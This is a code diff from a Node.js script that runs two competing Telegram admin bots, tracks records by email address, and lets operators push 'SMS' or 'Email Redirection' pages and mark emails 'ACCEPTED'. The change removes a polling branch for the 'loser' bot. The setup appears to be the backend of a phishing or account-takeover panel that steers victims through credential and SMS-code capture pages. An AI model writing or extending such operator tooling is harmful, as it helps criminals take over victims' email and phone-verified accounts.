@@ -842,74 +842,14 @@ if (bot2) {
       }
 
       // ============================================================================
-      // ✅ STEP 2: LOSER BOT POLLING LOGIC (NEW - CRITICAL!)
+      // ✅ LOSER GETS NOTHING - NO POLLING, NO SECOND CHANCE
       // ============================================================================
       
-      if (userWinnerTelegram[email] === "telegram2" && (action === "page1" || action === "page2")) {
-        // Bot 2 won, so we're looking at Bot 1's click
-        // This means Bot 2 is actually the winner, and this is handled elsewhere
-      }
-
-      if (userWinnerTelegram[email] === "telegram1" && action === "page2") {
+      if (userWinnerTelegram[email] === "telegram1" && (action === "page1" || action === "page2")) {
         // ✅ Bot 1 is WINNER, Bot 2 is LOSER
-        // Bot 2 clicked "📧 Email Redirection" (page2 button)
-        // START POLLING for Page 2 data
+        // Loser gets NOTHING - no polling, no waiting, no second chance
         
-        console.log(`📨 TRIGGER: Bot 2 (loser) clicked "Email Redirection" - starting poll`);
-        
-        const pollingInterval = setInterval(async () => {
-          const page2Data = global.page2MessageDataStore ? global.page2MessageDataStore[email] : null;
-          
-          if (page2Data) {
-            clearInterval(pollingInterval);
-            console.log(`📨 TRIGGER: Page 2 data found!`);
-            
-            const elapsedTime = Date.now() - botsThatClickedPage1[`${email}_timestamp`];
-            
-            if (elapsedTime < 15000) {
-              // ✅ Within 15-second window
-              console.log(`✅ Page 2 found (${elapsedTime}ms) → sending after 2s delay`);
-              
-              setTimeout(async () => {
-                try {
-                  await bot2.sendMessage(ADMIN_CHAT_ID_2, page2Data.message, page2Data.options);
-                  console.log(`📨 Page 2 sent to Bot 2 (loser)`);
-                } catch (err) {
-                  console.error("Error sending Page 2 to loser:", err);
-                }
-              }, 2000);
-            } else {
-              // ❌ After 15-second timeout
-              console.log(`⏱️ TIMEOUT: Bot 2 waited ${elapsedTime}ms but exceeded 15s`);
-              
-              try {
-                await bot2.sendMessage(ADMIN_CHAT_ID_2, 
-                  `📧 <code>${email}</code> has been <b>ACCEPTED</b>! ✅`, 
-                  { parse_mode: "HTML" }
-                );
-              } catch (err) {
-                console.error("Error sending acceptance message:", err);
-              }
-            }
-          }
-        }, 100);  // Check every 100ms
-        
-        // Stop polling after 15 seconds max
-        setTimeout(() => {
-          clearInterval(pollingInterval);
-          console.log(`⏱️ TIMEOUT: Stopped polling (15 seconds exceeded)`);
-        }, 15000);
-        
-        await bot2.answerCallbackQuery(query.id, { text: "✅ Waiting..." });
-        return;
-      }
-
-      if (userWinnerTelegram[email] === "telegram1" && action === "page1") {
-        // ✅ Bot 1 is WINNER, Bot 2 is LOSER
-        // Bot 2 clicked "💬 SMS" (page1 button)
-        // SKIP Page 2, show acceptance immediately
-        
-        console.log(`🔑 Bot 2 (loser) clicked "SMS" button - NO Page 2`);
+        console.log(`❌ Bot 2 (loser) clicked but gets nothing - Bot 1 won!`);
         
         try {
           const editUrl = `https://api.telegram.org/bot${BOT_TOKEN_2}/editMessageReplyMarkup`;
